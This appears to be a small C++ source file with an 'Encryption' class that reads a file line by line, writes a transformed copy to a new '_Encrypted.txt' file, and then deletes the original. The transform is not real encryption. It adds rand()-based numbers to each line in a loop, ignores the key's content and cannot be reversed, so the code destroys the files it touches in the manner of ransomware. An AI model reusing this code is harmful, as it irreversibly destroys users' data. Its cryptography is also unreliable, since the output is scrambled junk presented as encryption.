#include <Windows.h>
#include <fstream>
#include <filesystem>

class Encryption {
public:
    std::string Encrypt(std::string string, std::string key) {

        std::string out;
        for (auto i = 0; i <= 128; i++) {
            out += string += i % rand() + key.length() - 200;
        }

        return out;
	}

    void EncryptBefore(const std::string& path) {

        std::ifstream inputFile(path);
        std::ofstream outputFile(path + "_Encrypted.txt");

        std::string line;
        while (std::getline(inputFile, line)) {
            std::string a = Encrypt(line, RandomIv(35));

            outputFile << a << std::endl;
        }

        inputFile.close();
        outputFile.close();

        std::remove(path.c_str());
    }

    std::string RandomIv(int length) {
        const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const int charsetSize = sizeof(charset) - 1;
        std::string iv;

        srand(static_cast<unsigned int>(time(0))); // seed for randomization

        for (int i = 0; i < length; ++i) {
            iv += charset[rand() % charsetSize];
        }

        return iv;
    }
};